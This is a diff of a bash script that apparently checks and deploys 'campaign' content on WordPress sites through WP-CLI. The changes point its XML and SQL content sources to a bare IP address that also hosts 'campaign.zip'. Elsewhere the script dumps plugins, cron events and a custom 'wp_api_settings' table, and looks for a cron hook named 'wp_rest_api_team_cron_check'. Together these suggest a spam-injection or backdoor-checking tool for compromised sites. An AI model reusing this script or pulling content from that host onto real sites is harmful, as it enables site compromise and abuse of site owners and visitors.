@@ -9,8 +9,8 @@ blue="\033[1;34m"
 norm="\033[0m"
 
 source_campaign="http://198.148.116.171/666/xAGCx/campaign.zip"
-xml_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.xml"
-sql_agc="https://raw.githubusercontent.com/rootraven04/named/main/agc.txt"
+xml_agc="http://198.148.116.171/666/xAGCx/agc-india.xml"
+sql_agc="http://198.148.116.171/666/xAGCx/agc.txt"
 owner=$(echo -e "$(pwd)" | cut -d "/" -f3)
 if [[ $(id | grep "root" ) ]]; then extra="--allow-root"; else extra=""; fi
 
@@ -125,17 +125,21 @@ _CAMPAIGNCHECK() {
 		php wp-cli.phar plugin list $extra
 	echo -e "${blue}[~]${norm} Dumping wp-cron-event-list."
 		php wp-cli.phar cron event list $extra
+		# php wp-cli.phar cron event list | grep wp_rest_api_team_cron_check | awk '{print "[+]",$0}'
 	echo -e "${blue}[~]${norm} Dumping wp_api_settings table."
 		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)wp_api_settings" $extra
 
 }
+
+
+
 echo -ne "${blue}[~]${norm} Checking WP-CLI.phar is supported or not...\r" && sleep 0.8
 curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
 if [[ $(php wp-cli.phar $extra | grep "WP-CLI only works correctly from the command line") ]];
 then
-	echo -ne "${red}[!]${norm} Sorry, Wp-cli is not supported!                           \r" && exit
+	echo -ne "${red}[!] Sorry,${norm} Wp-cli is not supported!                           \r" && exit
 else
-	echo -ne "${green}[+]${norm} Congrats, Wp-cli is supported!                          \r" && sleep 0.8
+	echo -ne "${green}[+] Congrats,${norm} Wp-cli is supported!                          \r" && sleep 0.8
 fi
 
 rm -rf "wp-cli.phar"
